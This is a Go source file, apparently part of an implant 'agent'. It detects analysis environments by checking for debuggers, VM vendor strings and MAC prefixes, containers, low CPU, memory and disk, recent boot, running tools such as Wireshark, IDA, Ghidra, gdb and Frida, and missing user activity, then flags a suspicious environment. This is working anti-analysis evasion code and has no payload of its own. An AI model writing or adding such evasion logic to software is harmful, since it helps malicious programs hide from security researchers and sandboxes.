package agent

import (
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

type SandboxIndicators struct {
	LowCPU         bool
	LowMemory      bool
	RecentBoot     bool
	DebuggerPID    bool
	KnownVM        bool
	AnalysisProcs  bool
	InContainer    bool
	VMMACPrefix    bool
	SmallDisk      bool
	NoUserActivity bool
	Suspicious     int
}

var analysisProcesses = []string{
	"wireshark", "tshark", "tcpdump", "fiddler",
	"ida", "ida64", "idaq", "idaq64", "ghidra", "radare2", "r2", "cutter", "x64dbg", "x32dbg", "ollydbg",
	"gdb", "lldb", "strace", "ltrace", "frida", "frida-server",
	"procmon", "procexp", "autoruns", "processhacker",
	"vboxservice", "vboxtray", "vmtoolsd", "vmwaretray",
}

var vmMACPrefixes = []string{
	"08:00:27", "0a:00:27",
	"00:0c:29", "00:50:56",
	"52:54:00",
	"00:1c:42",
	"00:15:5d",
	"00:16:3e",
}

func CheckSandbox() *SandboxIndicators {
	ind := &SandboxIndicators{}

	if runtime.NumCPU() <= 2 {
		ind.LowCPU = true
		ind.Suspicious++
	}

	if runtime.GOOS == "linux" {
		checkMemory(ind)
		checkUptime(ind)
		checkDebugger(ind)
		checkVMDMI(ind)
		checkAnalysisProcesses(ind)
		checkContainer(ind)
		checkVMMAC(ind)
		checkDiskSize(ind)
		checkUserActivity(ind)
	}

	return ind
}

func (s *SandboxIndicators) IsSuspicious() bool {
	return s.Suspicious >= 3
}

func checkMemory(ind *SandboxIndicators) {
	data, err := os.ReadFile("/proc/meminfo")
	if err != nil {
		return
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "MemTotal:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				if kb, err := strconv.ParseInt(fields[1], 10, 64); err == nil && kb < 2*1024*1024 {
					ind.LowMemory = true
					ind.Suspicious++
				}
			}
			return
		}
	}
}

func checkUptime(ind *SandboxIndicators) {
	data, err := os.ReadFile("/proc/uptime")
	if err != nil {
		return
	}
	fields := strings.Fields(string(data))
	if len(fields) >= 1 {
		if uptime, err := strconv.ParseFloat(fields[0], 64); err == nil && uptime < float64(15*time.Minute/time.Second) {
			ind.RecentBoot = true
			ind.Suspicious++
		}
	}
}

func checkDebugger(ind *SandboxIndicators) {
	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "TracerPid:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 && fields[1] != "0" {
				ind.DebuggerPID = true
				ind.Suspicious++
			}
			return
		}
	}
}

func checkVMDMI(ind *SandboxIndicators) {
	dmiPaths := []string{
		"/sys/class/dmi/id/product_name",
		"/sys/class/dmi/id/sys_vendor",
		"/sys/class/dmi/id/board_vendor",
	}
	vmStrings := []string{"virtualbox", "vmware", "qemu", "kvm", "xen", "bochs", "parallels", "hyper-v"}
	for _, path := range dmiPaths {
		if data, err := os.ReadFile(path); err == nil {
			lower := strings.ToLower(string(data))
			for _, vm := range vmStrings {
				if strings.Contains(lower, vm) {
					ind.KnownVM = true
					ind.Suspicious++
					return
				}
			}
		}
	}
}

func checkAnalysisProcesses(ind *SandboxIndicators) {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return
	}
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		if _, err := strconv.Atoi(entry.Name()); err != nil {
			continue
		}
		comm, err := os.ReadFile(filepath.Join("/proc", entry.Name(), "comm"))
		if err != nil {
			continue
		}
		name := strings.TrimSpace(strings.ToLower(string(comm)))
		for _, proc := range analysisProcesses {
			if name == proc {
				ind.AnalysisProcs = true
				ind.Suspicious++
				return
			}
		}
	}
}

func checkContainer(ind *SandboxIndicators) {
	data, err := os.ReadFile("/proc/1/cgroup")
	if err != nil {
		return
	}
	lower := strings.ToLower(string(data))
	for _, marker := range []string{"docker", "lxc", "kubepods", "containerd"} {
		if strings.Contains(lower, marker) {
			ind.InContainer = true
			ind.Suspicious++
			return
		}
	}
	if _, err := os.Stat("/.dockerenv"); err == nil {
		ind.InContainer = true
		ind.Suspicious++
	}
}

func checkVMMAC(ind *SandboxIndicators) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return
	}
	for _, iface := range ifaces {
		mac := iface.HardwareAddr.String()
		if mac == "" {
			continue
		}
		macLower := strings.ToLower(mac)
		for _, prefix := range vmMACPrefixes {
			if strings.HasPrefix(macLower, prefix) {
				ind.VMMACPrefix = true
				ind.Suspicious++
				return
			}
		}
	}
}

func checkDiskSize(ind *SandboxIndicators) {
	data, err := os.ReadFile("/proc/partitions")
	if err != nil {
		return
	}
	for _, line := range strings.Split(string(data), "\n") {
		fields := strings.Fields(line)
		if len(fields) < 4 {
			continue
		}
		name := fields[3]
		if name == "sda" || name == "vda" || name == "nvme0n1" || name == "xvda" {
			blocks, err := strconv.ParseInt(fields[2], 10, 64)
			if err != nil {
				continue
			}
			sizeGB := blocks / (1024 * 1024)
			if sizeGB < 40 {
				ind.SmallDisk = true
				ind.Suspicious++
			}
			return
		}
	}
}

func checkUserActivity(ind *SandboxIndicators) {
	recentFiles := []string{
		os.Getenv("HOME") + "/.bash_history",
		os.Getenv("HOME") + "/.local/share/recently-used.xbel",
	}
	hasActivity := false
	cutoff := time.Now().Add(-24 * time.Hour)
	for _, path := range recentFiles {
		if info, err := os.Stat(path); err == nil {
			if info.ModTime().After(cutoff) && info.Size() > 100 {
				hasActivity = true
				break
			}
		}
	}
	if !hasActivity {
		ind.NoUserActivity = true
		ind.Suspicious++
	}
}
